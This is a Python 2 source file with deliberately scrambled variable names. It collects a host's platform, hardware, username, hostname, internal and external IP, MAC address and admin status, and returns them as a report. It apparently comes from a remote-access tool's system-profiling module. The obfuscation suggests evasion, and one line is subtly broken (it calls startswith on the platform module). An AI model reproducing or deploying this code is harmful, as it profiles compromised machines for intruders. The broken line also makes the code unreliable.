# -*- coding: utf-8 -*-















import ctypes



import getpass



import os



import platform



import socket



import urllib



import uuid















def neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj(plat_type):



    



    oaAetABtpQHRdocWZxiZEFbRuqmryPFo = platform.platform()



    processor    = platform.processor()



    architecture = platform.architecture()[0]







    



    XUPemEWbjcNvCXYqVfpnYRwtAIqKoJkP = getpass.getuser()







    



    vMuFcnVdEkDhYyNhGuNBAkWjYXyZzmEI    = socket.gethostname()



    yssXzADLjhfOBuHzpOukdIcUxitAlOZc        = socket.getfqdn()



    rKzpChTOISIXXQaBJkQdWevRNEPbSmOx = socket.gethostbyname(vMuFcnVdEkDhYyNhGuNBAkWjYXyZzmEI)



    IChfDTRVzHxqmEKiECFBLYZanZXFVuPs     = uuid.getnode()



    VRQDRkJXhVJTbIgXhkCpwGQChlsQtPQz         = ':'.join(("%012X" % IChfDTRVzHxqmEKiECFBLYZanZXFVuPs)[FBKtHfvmAKPrUbNKTLENkxiiABnCZCzG:FBKtHfvmAKPrUbNKTLENkxiiABnCZCzG+2] for FBKtHfvmAKPrUbNKTLENkxiiABnCZCzG in range(0, 12, 2))







    



    XfSJZpUuiajeMHHFsrKsWJfdglSJMLfn = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',



                   'ipecho.net/plain', 'myexternalip.com/raw' ]



    mwCvFaCuAuDNleNlFhjXRwnMlhiJEQxb = ''



    for MmphpJIxDLJQyKtNAvkoeDzFiuHWZtle in XfSJZpUuiajeMHHFsrKsWJfdglSJMLfn:



        try:



            mwCvFaCuAuDNleNlFhjXRwnMlhiJEQxb = urllib.urlopen('http://'+MmphpJIxDLJQyKtNAvkoeDzFiuHWZtle).read().rstrip()



        except IOError:



            pass



        if mwCvFaCuAuDNleNlFhjXRwnMlhiJEQxb and (6 < len(mwCvFaCuAuDNleNlFhjXRwnMlhiJEQxb) < 16):



            break







    



    WgEukUGvpfFKGfuJgDEaLalfRvKpPrrN = False







    if plat_type.startswith('win'):



        WgEukUGvpfFKGfuJgDEaLalfRvKpPrrN = ctypes.windll.shell32.IsUserAnAdmin() != 0







    elif plat_type.startswith('linux') or platform.startswith('darwin'):



        WgEukUGvpfFKGfuJgDEaLalfRvKpPrrN = os.getuid() == 0







    QuXDHCYivasxZLqcQlxfXdNdiajPcWby = 'Yes' if WgEukUGvpfFKGfuJgDEaLalfRvKpPrrN else 'No'







    tptlsBUYXwbLrWQfjKUYbLtaCuSwEaBL = '''



    System Platform     - {}



    Processor           - {}



    Architecture        - {}



    Hostname            - {}



    FQDN                - {}



    Internal IP         - {}



    External IP         - {}



    MAC Address         - {}



    Current User        - {}



    Admin Access        - {}



    '''.format(oaAetABtpQHRdocWZxiZEFbRuqmryPFo, processor, architecture,



    vMuFcnVdEkDhYyNhGuNBAkWjYXyZzmEI, yssXzADLjhfOBuHzpOukdIcUxitAlOZc, rKzpChTOISIXXQaBJkQdWevRNEPbSmOx, mwCvFaCuAuDNleNlFhjXRwnMlhiJEQxb, VRQDRkJXhVJTbIgXhkCpwGQChlsQtPQz, XUPemEWbjcNvCXYqVfpnYRwtAIqKoJkP, QuXDHCYivasxZLqcQlxfXdNdiajPcWby)







    return tptlsBUYXwbLrWQfjKUYbLtaCuSwEaBL



